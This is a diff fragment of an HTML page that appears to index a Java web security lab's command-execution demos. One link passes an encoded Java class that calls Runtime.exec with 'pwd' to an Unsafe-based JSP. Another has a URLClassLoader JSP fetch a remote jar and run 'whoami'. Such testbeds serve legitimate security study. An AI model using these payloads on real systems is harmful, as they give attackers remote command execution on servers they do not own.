+                           href="./modules/feature/unsafe.jsp?bytes=yv66vgAAADQAGgoABQAQCgARABIKABEAEwcAFAcAFQEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAKRXhjZXB0aW9ucwcAFgEAClNvdXJjZUZpbGUBAAxDb21tYW5kLmphdmEMAAYABwcAFwwAGAAZDAAKAAsBABBvcmcvc3UxOC9Db21tYW5kAQAQamF2YS9sYW5nL09iamVjdAEAE2phdmEvaW8vSU9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsAIQAEAAUAAAAAAAIAAQAGAAcAAQAIAAAAHQABAAEAAAAFKrcAAbEAAAABAAkAAAAGAAEAAAAIAAkACgALAAIACAAAACAAAgABAAAACLgAAiq2AAOwAAAAAQAJAAAABgABAAAACwAMAAAABAABAA0AAQAOAAAAAgAP&cmd=pwd">Unsafe </a>
+                        <div class="item-row-des">JDK11 之前使用 Unsafe 来定义任意的类对象并通过反射调用类方法</div>
+                        <span class="icon-left icon-yes"></span>
+                        <span class="icon-right icon-yes"></span>
+                    </div>
+                    <div class="item-row">
+                        <a class="item-row-title"
+                           href="./modules/feature/urlclassloader.jsp?jar=https://javaweb.org/tools/cmd.jar&cmd=whoami">URL
+                            ClassLoader </a>
+                        <div class="item-row-des">使用 URL ClassLoader 加载远程 jar 执行命令</div>
+                        <span class="icon-left icon-yes"></span>
+                        <span class="icon-right icon-yes"></span>
+                    </div>
+                </main>
+            </div>
+
+        </div>
+    </main>
+</div>
 </body>
 </html>
